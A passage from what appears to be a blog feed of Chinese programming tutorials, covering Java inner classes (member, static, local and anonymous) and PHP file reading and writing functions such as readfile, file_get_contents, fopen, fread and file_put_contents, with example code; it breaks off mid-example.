class="built_in">return</span> salary;    &#125;</span><br><span class="line">    public Date <span class="function"><span class="title">getHireDay</span></span>()&#123;   <span class="built_in">return</span> hireDay; &#125;</span><br><span class="line">    public void raiseSalary(double byPercent)&#123;</span><br><span class="line">            double raise=salary*byPercent/100;</span><br><span class="line">            salary+=raise;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">public boolean equals(Object otherObject)&#123;     //子类覆盖了Object的equals方法</span><br><span class="line">  <span class="keyword">if</span>(this==otherObject) <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">if</span>(otherObject==null) <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span>(getClass()!=otherObject.getClass())</span><br><span class="line">  <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">  Employee other=(Employee)otherObject;</span><br><span class="line">  <span class="built_in">return</span> name.equals(other.name)&amp;&amp;</span><br><span class="line">              salary==other.salary&amp;&amp;hireDay.equals(other.hireDay); </span><br><span class="line">                        //子类覆盖了Object的toString方法</span><br><span class="line"> &#125;</span><br><span class="line"> public String <span class="function"><span class="title">toString</span></span>()&#123;</span><br><span class="line">  <span class="built_in">return</span> getClass().getName()+</span><br><span class="line">           <span class="string">&quot;[name=&quot;</span>+name+<span class="string">&quot;,salary=&quot;</span>+salary+<span class="string">&quot;,hireDay=&quot;</span>+hireDay+<span class="string">&quot;]&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> private String name;</span><br><span class="line"> private double salary;</span><br><span class="line"> private Date hireDay;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;</p>
<h3 id="二、-内部类"><a href="#二、-内部类" class="headerlink" title="二、 内部类"></a><font color="#FF6347" face="Comic sans MS">二、 内部类</font></h3><h4 id="2-1-内部类的定义与使用"><a href="#2-1-内部类的定义与使用" class="headerlink" title="2.1  内部类的定义与使用"></a><font color="#20B2AA" face="Comic sans MS">2.1  内部类的定义与使用</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒内部类的定义：</strong></font>将类的定义置入一个用于封装它的类（外部类）里。<br>    <font color="#00B2EE"><strong>注意：</strong></font><br>    内部类不能与外部类同名（否则，编译器无法区分内部类与外部类），如果内部类还有内部类，内部类的内部类不能与它的任何一层外部类同名。<br>    <font color="#00B2EE"><strong>作用：</strong></font><br>    逻辑分组, 隐藏细节<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*内部类结合多态可以很方便的隐藏类的细节(包括类名)</span><br><span class="line">*/</span><br><span class="line">interface Contents&#123;</span><br><span class="line">  int value();</span><br><span class="line">&#125;</span><br><span class="line">interface Destination &#123;</span><br><span class="line">  String readLabel();</span><br><span class="line">&#125;</span><br><span class="line">class Goods&#123;</span><br><span class="line">    private class Content implements Contents&#123;  //<span class="string">&quot;private class Contentimplements Contents&quot;</span> </span><br><span class="line">        private int i=11;</span><br><span class="line">        public int <span class="function"><span class="title">value</span></span>()&#123;</span><br><span class="line">  <span class="built_in">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    protected class GDestination    //<span class="string">&quot;protected class GDestination implements Destination&quot;</span></span><br><span class="line">    implements Destination&#123;</span><br><span class="line">      private String label;</span><br><span class="line">  private GDestination(String whereTo)&#123;</span><br><span class="line">    label=whereTo;</span><br><span class="line">  &#125;</span><br><span class="line">public String <span class="function"><span class="title">readLabel</span></span>()&#123;</span><br><span class="line">    <span class="built_in">return</span> label;&#125;&#125;</span><br><span class="line">public Contents <span class="function"><span class="title">cont</span></span>()&#123;</span><br><span class="line">  <span class="built_in">return</span> new Content();</span><br><span class="line">  &#125;</span><br><span class="line">public Destination dest(String s)&#123;</span><br><span class="line">  <span class="built_in">return</span> new GDestination(s);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">public class TestGoods &#123;   //<span class="string">&quot;public class TestGoods&quot;</span></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">         Goods g=new Goods();</span><br><span class="line">         Contents c=g.cont();</span><br><span class="line">         Destination d=g.dest(<span class="string">&quot;Beijing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS"><font color="red"><strong>2. 📒内部类对象的创建：</strong></font>创建非静态内部类的对象时一定要确保已经有一个外部类对象。<br>(1) 利用外部类的方法创建并返回，因为方法是由外部类对象调用的，那创建该内部类对象时，一定已经拥有了所属的外部类对象了<br>public Contents cont(){  &emsp;&emsp;&emsp;&emsp;       Goods g=new Goods();<br>  return new Content();  &emsp;&emsp;&emsp;&emsp;&ensp;        Contents c=g.cont();<br>}</p>
<p>(2) 创建内部类还可以在除外部类中的其它类中，但是要确保该类具有访问内部类的权限，并且已经创建了一个外部类对象。格式如下：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outerObject=new outerClass(Constructor Parameters);</span><br><span class="line">outerClass.innerClass innerObject = outerObject.new InnerClass(Constructor Parameters);</span><br><span class="line"></span><br><span class="line"> Goods g1=new Goods();</span><br><span class="line"> Goods.Content c1=g.new Content(); </span><br><span class="line">OR</span><br><span class="line"> Goods g1=new Goods();</span><br><span class="line"> Goods.GDestination d1=g1.new GDestionation(); </span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 📒内部类的修饰符：</strong></font><br>（1）<font color="red"><strong>public、protected、private和缺省：</strong></font>访问权限修饰符，用来限定内部类的访问权限，<br>  &emsp;&emsp;一般的外部类是不能用protected和private修饰的。访问权限修饰符的限定和成员变量的限定一样。<br>（2）<font color="red"><strong>final:</strong></font>表明内部类不能继承。<br>（3）<font color="red"><strong>abstract：</strong></font>抽象内部类，不能被实例化。<br>（4）<font color="red"><strong>static：</strong></font>表明一个静态内部类。</p>
<p><font face="Comic sans MS"><font color="red"><strong>4. 📒静态内部类：</strong></font><br><strong>和普通的非静态内部类有较大的不同，使用时要遵循如下原则：</strong><br>（1）实例化static内部类时，在new前面不需要用对象变量；<br><font color="red"><strong>（2）static内部类中不能访问其外部类的非static属性及方法，即只能访问static成员；<br>（3）static方法中不能访问非static的属性及方法，也不能不带前缀地new一个非static的内部类。</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">      private int x;</span><br><span class="line">      void <span class="function"><span class="title">m</span></span>()&#123;</span><br><span class="line">  new B();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     static void <span class="function"><span class="title">sm</span></span>()&#123;</span><br><span class="line">      //在外部类的静态方法中</span><br><span class="line">     //不能直接创建内部类对象</span><br><span class="line">     //new B();//!!error</span><br><span class="line">    &#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">      <span class="function"><span class="title">B</span></span>()&#123;x=5;&#125;</span><br><span class="line">  &#125;//B类结束</span><br><span class="line">&#125;//A类结束</span><br><span class="line">class Outer</span><br><span class="line">&#123;</span><br><span class="line">  static class Inner</span><br><span class="line">  &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TestInnerStatic</span><br><span class="line">&#123;</span><br><span class="line">  public static void main(String[] args)  </span><br><span class="line">  &#123;</span><br><span class="line">    //创建非静态内部类B的对象a_b和ab</span><br><span class="line">    A.B a_b=new A().new B();</span><br><span class="line">    A a=new A();</span><br><span class="line">    A.B ab=a.new B();</span><br><span class="line">    </span><br><span class="line">    //创建静态内部类Inner的对象oi，不需要外部类Outer的对象</span><br><span class="line">    Outer.Inner oi=new Outer.Inner();</span><br><span class="line">    //Outer.Inner oi2=Outer.new Inner();//!!error</span><br><span class="line">    //Outer.Inner oi3=new Outer().new Inner();//!!error</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 📒内部类中访问外部类的成员：</strong></font><br>(1) 内部类中是可以直接访问外部类的其他属性与方法的，即使它们是private的。<br>(2) 如果内部类中有与外部类同名的属性与方法，可以使用下面的格式来表达外部类的引用，从而区分外部类和内部类的同名的属性与方法：<br>                       outerClass.this<br></font> </p>
<p>&emsp;<br>&emsp;</p>
<h4 id="2-2-方法和作用域中的内部类"><a href="#2-2-方法和作用域中的内部类" class="headerlink" title="2.2  方法和作用域中的内部类"></a><font color="#20B2AA" face="Comic sans MS">2.2  方法和作用域中的内部类</font></h4><p><font face="Comic sans MS"><font color="red"><strong>内部类也可以是局部的，它可以定义在一个方法甚至一个代码块之内。</strong></font><br>(1) 内部类中是可以直接访问外部类的其他属性与方法的，即使它们是private的。<br>(2) 如果内部类中有与外部类同名的属性与方法，可以使用下面的格式来表达外部类的引用，从而区分外部类和内部类的同名的属性与方法：<br>                       outerClass.this<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例1: 方法中的内部类:</span><br><span class="line">interface Destination &#123;</span><br><span class="line">  String readLabel();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Goods2 &#123;</span><br><span class="line">  String a=<span class="string">&quot;Goods2&quot;</span>;</span><br><span class="line">     public Destination dest(String s) &#123;</span><br><span class="line">          class GDestination implements Destination &#123;</span><br><span class="line">            private String label;</span><br><span class="line">            private GDestination(String whereTo) &#123;</span><br><span class="line">             label = whereTo;</span><br><span class="line">             System.out.println(<span class="string">&quot;access outer class:&quot;</span>+a);</span><br><span class="line">               &#125;</span><br><span class="line">               public String <span class="function"><span class="title">readLabel</span></span>() &#123; <span class="built_in">return</span> label; &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">return</span> new GDestination(s);</span><br><span class="line">     &#125;</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">          Goods2 g= new Goods2();</span><br><span class="line">          Destination d = g.dest(<span class="string">&quot;Beijing&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*在方法dest（）中定义了一个内部类，最后由这个方法返回这个内部类的对象。如果在用一个内部类的时候仅需要创建它的一个对象并传给外部，就可以这样做。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>方法中定义内部类的注意点:</strong></font><br> (1) 方法中定义的类，在其它地方使用时，没有类的名字，一般用其父类来引用这样的变量。<br> (2) 同局部变量一样，方法中的内部类前面不能用public，private，protected修饰，也不能用static修饰，但可以被final或abstract修饰。<br> (3) 方法中的内部类，可以访问其外部类的成员;若是static方法中的内部类，可以访问外部类的static成员。<br> (4) 方法中的内部类中，不能访问该方法的局部变量，除非是final的局部变量。<br></font></p>
<p>&emsp;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例2: 作用域中的内部类:</span><br><span class="line">public class Goods3&#123;</span><br><span class="line">     private void internalTracking(boolean b) &#123;</span><br><span class="line">          <span class="keyword">if</span>(b) &#123;</span><br><span class="line">               class TrackingSlip &#123;</span><br><span class="line">                    private String id;</span><br><span class="line">                    TrackingSlip(String s) &#123;</span><br><span class="line">                         id = s;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String <span class="function"><span class="title">getSlip</span></span>() &#123; <span class="built_in">return</span> id; &#125;</span><br><span class="line">               &#125;</span><br><span class="line">              TrackingSlip ts = new TrackingSlip(<span class="string">&quot;slip&quot;</span>);</span><br><span class="line">               String s = ts.getSlip();</span><br><span class="line">          &#125; </span><br><span class="line">     &#125;</span><br><span class="line"> public void <span class="function"><span class="title">track</span></span>() &#123; internalTracking(<span class="literal">true</span>); &#125;</span><br><span class="line">     public static void main(String[] args) &#123;</span><br><span class="line">          Goods3 g= new Goods3();</span><br><span class="line">          g.track();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="2-3-匿名内部类"><a href="#2-3-匿名内部类" class="headerlink" title="2.3  匿名内部类 "></a><font color="#20B2AA" face="Comic sans MS">2.3  匿名内部类 </font></h4><p><font face="Comic sans MS"><font color="red"><strong>匿名类：</strong></font> 类或方法中定义的一种没有类名的特殊内部类。<br><font color="red"><strong>作用：</strong></font>当需要创建一个类的对象而且用不上它的名字时，使用内部类可以使代码看上去简洁清楚。<br><font color="red"><strong>语法规则如下：</strong></font><br>       new interfacename(){……};<br>      或new superclassname(){……};</p>
<p><font color="red"><strong>注意：</strong></font><br> (1) 这种类不取名字，而直接用其父类的名字或者它所实现的接口的名字；<br> (2) 类的定义与创建该类的一个对象同时进行，即类的定义前面有一个new，没有类的首部，对象的创建和类体共同构成一个匿名类表达式，后面以“;”结束；<br> (3) 类中不能定义构造方法，因为它没有名字。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">interface Contents&#123;</span><br><span class="line">  int value();</span><br><span class="line">&#125;</span><br><span class="line">public class Goods4 &#123;</span><br><span class="line">     public Contents <span class="function"><span class="title">cont</span></span>()&#123;</span><br><span class="line">          //返回匿名类对象，该匿名类继承了Contents接口</span><br><span class="line">          <span class="built_in">return</span> new <span class="function"><span class="title">Contents</span></span>()&#123;</span><br><span class="line">               private int i = 11;</span><br><span class="line">               public int <span class="function"><span class="title">value</span></span>() &#123; </span><br><span class="line">                    <span class="built_in">return</span> i; </span><br><span class="line">               &#125;</span><br><span class="line">          &#125;;</span><br><span class="line">     &#125;</span><br><span class="line"> public static void main(String[] args)</span><br><span class="line">     &#123;</span><br><span class="line">      Goods4 g=new Goods4();</span><br><span class="line">      Contents c=g.cont();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-文件系统</title>
    <url>/post/PHP-FileSystem/</url>
    <content><![CDATA[<p>学习文件处理本质上面就是学习<font color="#00B2EE"><strong>文件处理的函数。</strong></font> ヾ(๑╹◡╹)ﾉ”</p>
<a id="more"></a>

<p>&ensp;<br>&ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 文件系统</font></center>

<p>&emsp;<br>&emsp;</p>
<h3 id="一-读取文件"><a href="#一-读取文件" class="headerlink" title="一. 读取文件"></a><font color="#FF6347" face="Comic sans MS">一. 读取文件</font></h3><p>&emsp;</p>
<h4 id="1-1-readfile读取文件"><a href="#1-1-readfile读取文件" class="headerlink" title="1.1 readfile读取文件"></a><font color="#3CB371" face="Comic sans MS">1.1 readfile读取文件</font></h4><p>读取一个文件内容的函数：<font color="#00B2EE" face="Comic sans MS"><strong>int readfile ( string $文件名)</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：传入一个文件路径，输出这个文件里面的内容。</strong></font></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //linux类的读取方式</span><br><span class="line">   readfile(<span class="string">&quot;/home/paul/test.txt&quot;</span>);</span><br><span class="line">   //windows类的读取方式</span><br><span class="line">   readfile(<span class="string">&quot;c:\\boot.ini&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong>上面的代码中windows的斜线是\斜线，可能会转义掉一些字符。因此，我们写的时候写上两个斜线。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-2-file-get-contents打开文件"><a href="#1-2-file-get-contents打开文件" class="headerlink" title="1.2 file_get_contents打开文件"></a><font color="#3CB371" face="Comic sans MS">1.2 file_get_contents打开文件</font></h4><p><font face="Comic sans MS">上面的是单纯打文件就直接输出了，有没有打开文件后，能够赋值给一个变量的操作方式呢。</font><br><font color="#00B2EE" face="Comic sans MS"><strong>string file_get_contents ( string filename)</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：传入一个文件或文件路径，打开这个文件<font color="#00B2EE">返回</font>文件的内容。文件的内容是一个字符串。</strong></font></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;NoAlike.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$filestring</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$filestring</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面的代码，就打开了一个文件，并且将文件当中的内容进行了输出。</p>
</blockquote>
<p>&emsp;<br>我们来针对之前的知识把代码进行一下扩展。用一用之前的知识点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//假设我们有一个多行的文件叫NoAlike.txt，没有的话你可以新建一个这个文件</span></span><br><span class="line">    $filename = <span class="string">&#x27;NoAlike.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//打开这个文件，将文件内容赋值给$filestring</span></span><br><span class="line">   $filestring = file_get_contents($filename);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//因为每一行有一个回车即\n，我用\n来把这个字符串切割成数组</span></span><br><span class="line">   $filearray = explode(<span class="string">&quot;\n&quot;</span>, $filestring);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//把切割成的数组，下标赋值给$key,值赋值给$val，每次循环将$key加1。</span></span><br><span class="line">   <span class="keyword">while</span> (<span class="keyword">list</span>($key, $val) = each($filearray)) &#123;</span><br><span class="line">       ++$key;</span><br><span class="line">       $val = trim($val);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//用的单引号，单引号不解释变量进行了拼接而已</span></span><br><span class="line">       <span class="keyword">print</span> <span class="string">&#x27;Line&#x27;</span> . $key .<span class="string">&#x27;:&#x27;</span>.  $val.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS">上述的<font color="#00B2EE">explode()、list()</font>两个字符串函数和<font color="#00B2EE">each()</font>数组函数。<br><font color="red"><strong>1. explode()函数：</strong></font><strong>把字符串打散为数组</strong>。</font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_explode.asp">PHP explode() 函数</a>]</font>&emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_ref_string.asp">PHP String 函数</a>]</font><br>语法：explode(separator,string,limit)<br><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">separator</td>
<td align="left">必需。规定在哪里分割字符串。</td>
</tr>
<tr>
<td align="center">string</td>
<td align="left">必需。要分割的字符串。</td>
</tr>
<tr>
<td align="center">limit</td>
<td align="left">可选。规定所返回的数组元素的数目。<br>可能的值：<br>大于 0 - 返回包含最多 limit 个元素的数组<br>小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组<br>0 - 返回包含一个元素的数组</td>
</tr>
</tbody></table>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. list()函数：</strong></font><strong>把数组中的值赋给一些变量,在一次操作中给一组变量赋值。</strong></font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_list.asp">PHP list() 函数</a>]</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">&quot;Dog&quot;</span>,<span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>($a, $b, $c) = $my_array;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I have several animals, a <span class="subst">$a</span>, a <span class="subst">$b</span> and a <span class="subst">$c</span>.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. each()函数：</strong></font><strong>返回当前元素的键名和键值。该元素的键名和键值返回到带有四个元素的数组中。<br>两个元素（1 和 Value）包含键值，两个元素（0 和 Key）包含键名。</strong></font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_each.asp">PHP each() 函数</a>]</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$people = <span class="keyword">array</span>(<span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;Steve&quot;</span>, <span class="string">&quot;Mark&quot;</span>, <span class="string">&quot;David&quot;</span>);</span><br><span class="line">var_dump(each($people));</span><br><span class="line">var_dump(each($people));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">G:\WAMP\www\<span class="number">2</span><span class="number">-20</span><span class="number">-1.</span>php:<span class="number">3</span>:</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">4</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Bill&#x27;</span> (length=<span class="number">4</span>)</span><br><span class="line">  <span class="string">&#x27;value&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Bill&#x27;</span> (length=<span class="number">4</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">  <span class="string">&#x27;key&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">G:\WAMP\www\<span class="number">2</span><span class="number">-20</span><span class="number">-1.</span>php:<span class="number">4</span>:</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">4</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Steve&#x27;</span> (length=<span class="number">5</span>)</span><br><span class="line">  <span class="string">&#x27;value&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Steve&#x27;</span> (length=<span class="number">5</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="string">&#x27;key&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-3-fopen、fread、fclose操作读取文件"><a href="#1-3-fopen、fread、fclose操作读取文件" class="headerlink" title="1.3 fopen、fread、fclose操作读取文件"></a><font color="#3CB371" face="Comic sans MS">1.3 fopen、fread、fclose操作读取文件</font></h4><p>上面file_get_contents打开文件的方式简单、粗暴。下面的<br><font face="Comic sans MS"><font color="#00B2EE"><strong>resource fopen ( string $文件名, string 模式)<br>string fread ( resource $操作资源, int 读取长度)<br>bool fclose ( resource $操作资源 )</strong></font></p>
<p>通过上面的函数我们来讲解<strong>资源类型</strong>的通常操作方式：<br>1.打开资源<br>2.使用相关函数进行操作<br>3.关闭资源<br>&emsp;<br><font color="red"><strong>1. fopen函数：</strong></font><strong>打开文件，返回一个资源</strong><br>参数主要有两个：1.文件打开的路径，2.打开文件的模式<br>例：$fp=fopen(‘NoAlike.txt’, “r”);<br></font></p>
<blockquote>
<p><strong>返回类型是一个资源类型。<br>资源类型需要其他的函数来操作这个资源。</strong><font color="#FF7F00"><strong>所有的资源有打开就要有关闭。</strong></font></p>
</blockquote>
<p><font face="Comic sans MS"><font color="red"><strong>2. fread函数：</strong></font><strong>读取打开的文件资源。</strong><br>也包含两个参数，读取指定长度的文件资源，读取一部份向后移动一部份。至到文件结尾。<br>例：$contents = fread($fp, 1024);<br></font></p>
<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. fclose函数：</strong></font><strong>fclose函数的功能是关闭资源。资源有打开就有关闭。</strong><br>包含一个参数，这个参数就是fopen()返回的资源。<br>例：fclose($fp);<br></font> </p>
<p>&emsp;<br><font color="#FF7F00"><strong>fopen的模式</strong></font>有下面几个(。・∀・)ノ<br><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">r</td>
<td align="left">只读方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td align="center">r+</td>
<td align="left">读写方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td align="center">w</td>
<td align="left">写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">w+</td>
<td align="left">读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">a</td>
<td align="left">写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">a+</td>
<td align="left">读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之</td>
</tr>
<tr>
<td align="center">x</td>
<td align="left">创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回<br> FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">x+</td>
<td align="left">创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 <br>FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建</td>
</tr>
</tbody></table>
<p>&emsp;<br><font color="#00B2EE"><strong>r模式示例：</strong></font><br>1.打开文件：fopen()<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//你可以创建一个NoAlike.txt，以只读模式打开</span></span><br><span class="line">   $fp = fopen(<span class="string">&#x27;NoAlike.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//var_dump()操作一下$fp看看效果，输出的是不是只有类型提示的是resource</span></span><br><span class="line">   var_dump($fp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>2.读取文件：fread()<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $fp = fopen(<span class="string">&#x27;NoAlike.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//打开一个文件类型后，读取长度</span></span><br><span class="line">   $contents = fread($fp, <span class="number">1024</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br>3.关闭文件：fclose()<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $fp = fopen($filename, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">   $contents = fread($fp, <span class="number">1024</span>);</span><br><span class="line">   fclose($fp);</span><br><span class="line">   <span class="keyword">echo</span> $contents;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;<br><strong>其他注意事项：</strong></p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">t</td>
<td align="left">windows下将\n转为\r\n</td>
</tr>
<tr>
<td align="center">b</td>
<td align="left">二进制打开模式</td>
</tr>
</tbody></table>
<blockquote>
<p><font color="#FF7F00"><strong>说明：</strong></font><br>Windows 下提供了一个文本转换标记（’t’）可以透明地将 \n 转换为 \r\n。<br>与此对应还可以使用 ‘b’ 来强制使用二进制模式，这样就不会转换数据。要使用这些标记，要么用 ‘b’ 或者用 ‘t’ 作为 mode 参数的最后一个字符。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h3 id="二-创建和修改文件内容"><a href="#二-创建和修改文件内容" class="headerlink" title="二. 创建和修改文件内容"></a><font color="#FF6347" face="Comic sans MS">二. 创建和修改文件内容</font></h3><h4 id="2-1-file-put-contents写入文件"><a href="#2-1-file-put-contents写入文件" class="headerlink" title="2.1 file_put_contents写入文件"></a><font color="#3CB371" face="Comic sans MS">2.1 file_put_contents写入文件</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>int file_put_contents ( string $文件路径, string $写入数据])</strong></font><br></font></p>
<blockquote>
<p><strong>功能：向指定的文件当中写入一个字符串，如果文件不存在则创建文件。返回的是写入的字节长度</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $data = <span class="string">&quot;在PHP中文网学好PHP，妹子票子不再话下！&quot;</span>;</span><br><span class="line"></span><br><span class="line">   $numbytes = file_put_contents(<span class="string">&#x27;bin.txt&#x27;</span>, $data);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>($numbytes)&#123;</span><br><span class="line">      <span class="comment">//$numbytes接收到整形的数字</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;写入成功，我们读取看看结果试试：&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;bin.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;写入失败或者没有权限，注意检查&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span 